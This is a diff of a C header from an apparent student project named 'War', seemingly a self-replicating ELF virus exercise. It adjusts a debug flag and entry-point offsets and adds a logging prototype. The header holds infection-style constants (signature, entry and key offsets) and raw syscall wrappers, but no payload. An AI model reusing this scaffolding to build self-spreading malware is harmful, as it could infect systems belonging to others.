@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/08 18:35:31 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/09 14:56:45 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,6 +28,10 @@
 /* Enum */
 
 /* Define */
+
+// debug
+# define DEBUG
+
 # define SIGNATURE	0x216948	// 'Hi!'
 
 # define USER_ENTRY	2
@@ -39,7 +43,12 @@
 # define BUFF_SIZE	0x1000
 # define PROG_INFO	512
 
-# define ENTRY_OFF	2194
+# ifdef DEBUG
+#  define ENTRY_OFF	2331
+# else
+#  define ENTRY_OFF 2183
+# endif
+
 # define KEY_OFF	28
 
 # define __INLINE__	__attribute__((__always_inline__)) inline
@@ -49,8 +58,6 @@
 # define CREATED_BY	"War version "VERSION" (c)oded by Jle-Quel & DjeDt"
 # define CREATE_SZ	43
 
-// debug
-# define DEBUG
 
 /* Structures */
 typedef struct __PACKED__ linux_dirent64
@@ -149,6 +156,7 @@ int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
 bool			check_name(char *str, int len);
 
+void			_log(char *msg, size_t size);
 pid_t			_fork(void);
 int				_execve(const char *filename, char *const argv[], char *const envp[]);
 void			__exit(int status);
